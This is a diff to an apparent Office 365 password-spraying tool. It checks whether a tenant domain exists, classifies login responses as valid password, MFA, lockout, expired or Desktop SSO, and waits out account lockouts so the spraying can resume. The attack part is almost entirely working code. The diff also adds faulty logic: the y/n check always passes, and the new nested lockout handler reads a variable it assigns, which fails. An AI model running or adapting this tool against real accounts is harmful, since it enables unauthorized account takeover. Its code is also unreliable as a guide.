@@ -214,16 +214,19 @@ def main():
         url = (
             f"https://login.microsoftonline.com/getuserrealm.srf?login=user@{domain_name}")
         request = o365request.get(url)
-        print(request)
+        # print(request)
         response = request.text
-        print(response)
+        # print(response)
         valid_response = re.search('"NameSpaceType":"Managed",', response)
         valid_response1 = re.search('"NameSpaceType":"Federated",', response)
         if args.verbose:
             print(domain_name, request, response, valid_response)
-        if valid_response or valid_response1:
+        if valid_response:
             print(
-                success + f"\n[success] The listed domain {domain_name} exists.\n" + close)
+                success + f"[success] The listed domain {domain_name} exists. Domain is Managed.\n" + close)
+        elif valid_response1:
+            print(
+                success + f"[success] The listed domain {domain_name} exists. Domain is Federated.\n" + close)
         else:
             print(
                 fail + f"[info] The listed domain {domain_name} does not exist.\n" + close)
@@ -253,6 +256,8 @@ def main():
                 mfa_true1 = re.search('50079', response)
                 desktopsso_response = re.search('{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
                 conditional_access = re.search('50158', response)
+                if args.verbose:
+                    print('\n', email, s, email_line, email, body, request, response, valid_response, account_doesnt_exist, account_invalid_password, account_disabled, valid_response1, password_expired, account_locked_out, mfa_true, mfa_true1, desktopsso_response, conditional_access, '\n')                
                 if valid_response:
                     counter = counter + 1
                     b = success + "Result - " + " "*1 + "VALID PASSWORD! [+]"
@@ -272,7 +277,7 @@ def main():
                 if account_locked_out:
                     b = "Result - " + " "*13 + "LOCKOUT DETECTED! [!]"
                     print(info + f"[!] {email:44} {b}" + close)
-                    lockout_counter = lockout_counter + 1
+                    lockout_counter = lockout_counter + 1   
                     if args.lockout:
                         lock_time = args.lockout
                     if args.lockout is None:
@@ -280,23 +285,23 @@ def main():
                     lockout = int(lock_time) * 60
                     if lockout_counter == 3:
                         print(fail + f'\n[warn] Multiple lockouts detected.\n')
-                        con_proc = input("Would you like to continue the scan after the lockout period is over? (y/n) ")
-                        if con_proc == "y" or "Y":
-                            print(
-                                info + f"Waiting {lockout} seconds before continuing.")
-                            lockout = lockout - 30
-                            time.sleep(int(lockout))
-                            print(info + f'\nContinuing scan in 30 seconds.')
-                            time.sleep(int(30))
-                            timeout_counter = 0
-                            lockout_counter = 0
-                        elif con_proc == "n" or "N":
-                            print(info + "Quitting.")
-                            sys.exit()
-                        else:
-                            print(
-                                fail + f"\n[warn] Invalid input. Quitting.\n")
-                            sys.exit()
+                        def timeout_proc():
+                            con_proc = input("Would you like to continue the scan after the lockout period is over? (y/n) ")
+                            if con_proc == "y" or "Y":
+                                print(
+                                    info + f"Waiting {lockout} seconds before continuing.")
+                                lockout = lockout - 30
+                                time.sleep(int(lockout))
+                                print(info + f'\nContinuing scan in 30 seconds.')
+                                time.sleep(int(30))
+                                timeout_counter = 0
+                                lockout_counter = 0
+                            elif con_proc == "n" or "N":
+                                print(info + "Quitting.")
+                                sys.exit()
+                            else:
+                                timeout_proc()
+                        timeout_proc()
                 if desktopsso_response:
                     a = email
                     b = " Result -  Desktop SSO Enabled [!]"
@@ -308,7 +313,8 @@ def main():
                     print(fail + f"[-] {email:43} {b}" + close)
                 if password_expired:
                     a = email
-                    b = " Result - " + " "*9 + "User Password Expired [!]"
+                    b = " Result - " + " "*7 + "Expired - Try Resetting [!]"
+                    counter = counter + 1
                     print(info + f"[!] {email:43} {b}" + close)
                 if mfa_true:
                     counter = counter + 1
